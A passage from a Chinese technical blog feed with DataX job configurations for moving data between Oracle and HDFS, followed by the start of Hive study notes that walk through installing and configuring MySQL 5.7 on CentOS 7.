class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <br>        <span class="hljs-attr">&quot;setting&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;speed&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;channel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="3-从Oracle读取"><a href="#3-从Oracle读取" class="headerlink" title="3. 从Oracle读取"></a>3. 从Oracle读取</h3><p>新建用于测试的表如图，并造几条数据</p><img src="/2022/01/newpost-30/image-20220111101104977.png" class="" title="image-20220111101104977"><p>参考<a href="https://open.oceanbase.com/docs/community/oceanbase-database/V3.1.0/use-datax-to-full-migration-data-to-oceanbase">Oracle读-文档</a>编辑json文本如下，刚开始尝试可以先打印结果，确认成功之后再写HDFS</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;job&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;content&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;reader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;oraclereader&quot;</span><span class="hljs-punctuation">,</span> <br>                    <span class="hljs-attr">&quot;parameter&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;column&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;ID&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;NAME&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;EXPORT_DATE&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <br>                        <span class="hljs-attr">&quot;connection&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                            <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-attr">&quot;jdbcUrl&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                                    <span class="hljs-string">&quot;jdbc:oracle:thin:@localhost:1521:orcl&quot;</span><br>                                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <br>                                <span class="hljs-attr">&quot;table&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                                    <span class="hljs-string">&quot;test&quot;</span><br>                                <span class="hljs-punctuation">]</span><br>                            <span class="hljs-punctuation">&#125;</span><br>                        <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <br>                        <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span> <br>                        <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;test&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <br>                <span class="hljs-attr">&quot;writer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;streamwriter&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;parameter&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;print&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <br>        <span class="hljs-attr">&quot;setting&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;speed&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;channel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>把上边的文本写入【/export/software/datax/job/oracle2stream.json】文件中，然后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /export/software/datax/<br>python bin/datax.py job/oracle2stream.json<br></code></pre></td></tr></table></figure><p>可以在控制台看到成功打印之前造的数据</p><img src="/2022/01/newpost-30/image-20220111103428848.png" class="" title="image-20220111103428848"><p>扩展：这里的【table】可以写多个表结构相同的表名，最后写入HDFS也会写入多个文件</p><h3 id="4-写入HDFS"><a href="#4-写入HDFS" class="headerlink" title="4. 写入HDFS"></a>4. 写入HDFS</h3><p>在HDFS新建目录<code>datax</code>，用于接收数据，参考<a href="https://github.com/alibaba/DataX/blob/master/hdfswriter/doc/hdfswriter.md">HDFS写-文档</a>继续编辑上边的json文本如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;job&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;content&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;reader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;oraclereader&quot;</span><span class="hljs-punctuation">,</span> <br>                    <span class="hljs-attr">&quot;parameter&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;column&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;ID&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;NAME&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;EXPORT_DATE&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <br>                        <span class="hljs-attr">&quot;connection&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                            <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-attr">&quot;jdbcUrl&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                                    <span class="hljs-string">&quot;jdbc:oracle:thin:@localhost:1521:orcl&quot;</span><br>                                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <br>                                <span class="hljs-attr">&quot;table&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                                    <span class="hljs-string">&quot;test&quot;</span><br>                                <span class="hljs-punctuation">]</span><br>                            <span class="hljs-punctuation">&#125;</span><br>                        <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <br>                        <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span> <br>                        <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;test&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <br>                <span class="hljs-attr">&quot;writer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;hdfswriter&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;parameter&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;defaultFS&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;hdfs://localhost:9000&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;fileType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;text&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/datax&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;fileName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;column&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                            <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ID&quot;</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;INT&quot;</span><br>                            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;NAME&quot;</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;VARCHAR&quot;</span><br>                            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;EXPORT_DATE&quot;</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;TIMESTAMP&quot;</span><br>                            <span class="hljs-punctuation">&#125;</span><br>                        <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;writeMode&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;append&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;fieldDelimiter&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;\t&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <br>        <span class="hljs-attr">&quot;setting&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;speed&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;channel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>把上边的文本写入【/export/software/datax/job/oracle2hdfs.json】文件中，然后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /export/software/datax/<br>python bin/datax.py job/oracle2hdfs.json<br></code></pre></td></tr></table></figure><p>可以在HDFS看到之前造的数据</p><img src="/2022/01/newpost-30/image-20220111110808648.png" class="" title="image-20220111110808648"><p>如果在<code>writer</code>配置中【EXPORT_DATE】字段设置type为date，则日期后的时分秒会丢失，如下图</p><img src="/2022/01/newpost-30/image-20220111110302015.png" class="" title="image-20220111110302015"><h3 id="5-HDFS-gt-Oracle"><a href="#5-HDFS-gt-Oracle" class="headerlink" title="5. HDFS-&gt;Oracle"></a>5. HDFS-&gt;Oracle</h3><p>参考<a href="https://github.com/alibaba/DataX/blob/master/hdfsreader/doc/hdfsreader.md">HDFS读-文档</a>和<a href="https://github.com/alibaba/DataX/blob/master/oraclewriter/doc/oraclewriter.md">Oracle写-文档</a>编辑json文本如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;job&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;content&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;reader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;hdfsreader&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;parameter&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/datax/*&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;defaultFS&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;hdfs://localhost:9000&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;fileType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;text&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;column&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                               <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-attr">&quot;index&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;long&quot;</span><br>                               <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                               <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-attr">&quot;index&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;string&quot;</span><br>                               <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                               <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-attr">&quot;index&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;date&quot;</span><br>                               <span class="hljs-punctuation">&#125;</span><br>                        <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;fieldDelimiter&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;\t&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;writer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;oraclewriter&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;parameter&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;column&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br><span class="hljs-string">&quot;ID&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-string">&quot;NAME&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-string">&quot;EXPORT_DATE&quot;</span><br><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;connection&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;jdbcUrl&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jdbc:oracle:thin:@localhost:1521:orcl&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;table&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br><span class="hljs-string">&quot;test&quot;</span><br><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;test&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;setting&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;speed&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;channel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><ul><li><p>这里有一个细节，在Oracle<strong>读取</strong>时，jdbcUrl参数是个<strong>数组</strong>，Oracle<strong>写入</strong>时就是<strong>字符串</strong>了，如果还写数组，就会报下边的错</p><p>  <code>java.sql.SQLException: No suitable driver found for [&quot;jdbc:oracle:thin:@localhost:1521:orcl&quot;]]</code></p></li></ul><p>把上边的文本写入【/export/software/datax/job/hdfs2oracle.json】文件中，然后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /export/software/datax/<br>python bin/datax.py job/hdfs2oracle.json<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
      <tag>大数据</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apache Hive 学习笔记</title>
    <link href="/2022/01/newpost-29/"/>
    <url>/2022/01/newpost-29/</url>
    
    <content type="html"><![CDATA[<p>本文基于B站视频教程<a href="https://www.bilibili.com/video/BV1CU4y1N7Sh">2022最新黑马程序员大数据Hadoop入门视频教程，最适合零基础自学的大数据Hadoop教程</a>，p51-p83，本文软件版本，行文顺序等可能与视频略有不同</p><span id="more"></span><p>所需安装包等可以关注【黑马程序员】公众号，回复【hadoop】获取</p><h1 id="一-Hive理解"><a href="#一-Hive理解" class="headerlink" title="一. Hive理解"></a>一. Hive理解</h1><ul><li><p>Hive能将数据文件映射成为一张表</p><ul><li>映射指文件和表之间的对应关系</li></ul></li><li><p>功能职责</p><ul><li>SQL语法解析编译成MapReduce</li></ul></li></ul><img src="/2022/01/newpost-29/image-20220112145646316.png" class="" title="image-20220112145646316"><h2 id="架构图"><a href="#架构图" class="headerlink" title="架构图"></a>架构图</h2><img src="/2022/01/newpost-29/image-20220112145835885.png" class="" title="image-20220112145835885"><h1 id="二、-安装"><a href="#二、-安装" class="headerlink" title="二、 安装"></a>二、 安装</h1><h2 id="1-安装MySQL"><a href="#1-安装MySQL" class="headerlink" title="1.安装MySQL"></a>1.安装MySQL</h2><h3 id="1-1-卸载mariadb"><a href="#1-1-卸载mariadb" class="headerlink" title="1.1 卸载mariadb"></a>1.1 卸载mariadb</h3><p>卸载Centos7自带的mariadb，先查找已经安装的mariadb</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">rpm -qa|grep mariadb<br></code></pre></td></tr></table></figure><img src="/2022/01/newpost-29/image-20220112151756449.png" class="" title="image-20220112151756449"><p>卸载</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">rpm -e mariadb-libs-5.5.68-1.el7.x86_64 --nodeps<br></code></pre></td></tr></table></figure><h3 id="1-2-安装MySQL"><a href="#1-2-安装MySQL" class="headerlink" title="1.2 安装MySQL"></a>1.2 安装MySQL</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">mkdir</span> /export/software/mysql<br><span class="hljs-comment">#上传mysql-5.7.29-1.el7.x86_64.rpm-bundle.tar 到上述文件夹下  解压</span><br><span class="hljs-built_in">cd</span> /export/software/mysql<br>tar xvf mysql-5.7.29-1.el7.x86_64.rpm-bundle.tar<br>yum -y install libaio<br>yum -y install net-tools<br>rpm -ivh mysql-community-common-5.7.29-1.el7.x86_64.rpm mysql-community-libs-5.7.29-1.el7.x86_64.rpm mysql-community-client-5.7.29-1.el7.x86_64.rpm mysql-community-server-5.7.29-1.el7.x86_64.rpm<br></code></pre></td></tr></table></figure><img src="/2022/01/newpost-29/image-20220112152622346.png" class="" title="image-20220112152622346"><h3 id="1-3-MySQL初始化设置"><a href="#1-3-MySQL初始化设置" class="headerlink" title="1.3 MySQL初始化设置"></a>1.3 MySQL初始化设置</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment">#初始化</span><br>mysqld --initialize<br><br><span class="hljs-comment">#更改所属组</span><br><span class="hljs-built_in">chown</span> mysql:mysql /var/lib/mysql -R<br><br><span class="hljs-comment">#启动mysql</span><br>systemctl start mysqld.service<br><br><span class="hljs-comment">#查看生成的临时root密码</span><br><span class="hljs-built_in">cat</span>  /var/log/mysqld.log<br><span class="hljs-comment"># [Note] A temporary password is generated for root@localhost: !?cp.!nG,8e/</span><br></code></pre></td></tr></table></figure><img src="/2022/01/newpost-29/image-20220112153840993.png" class="" title="image-20220112153840993"><h3 id="1-4-准备使用"><a href="#1-4-准备使用" class="headerlink" title="1.4 准备使用"></a>1.4 准备使用</h3><p>修改root密码 授权远程访问 设置开机自启动</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">mysql -u root -p<br></code></pre></td></tr></table></figure><p>然后输入上边生成的密码，回车，通过下边的命令修改root密码为<code>hadoop</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">alter</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">user</span>() identified <span class="hljs-keyword">by</span> &quot;hadoop&quot;;<br></code></pre></td></tr></table></figure><p>授权</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">use mysql;<br><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> PRIVILEGES <span class="hljs-keyword">ON</span> <span class="hljs-operator">*</span>.<span class="hljs-operator">*</span> <span class="hljs-keyword">TO</span> <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;hadoop&#x27;</span> <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">GRANT</span> OPTION;<br>FLUSH PRIVILEGES;<br></code></pre></td></tr></table></figure><p><code>Ctrl</code>+<code>D</code>退出MySQL命令界面。</p><p>MySQL启、停、状态命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">systemctl stop mysqld<br>systemctl status mysqld<br>systemctl start mysqld<br></code></pre></td></tr></table></figure><p>设置开机启动</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">systemctl <span class="hljs-built_in">enable</span> mysqld<br></code></pre></td></tr></table></figure><h3 id="1-5-干净卸载"><a href="#1-5-干净卸载" class="headerlink" title="1.5 干净卸载"></a>1.5 干净卸载</h3><p>CentOS7 干净卸载MySQL 5.7</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span 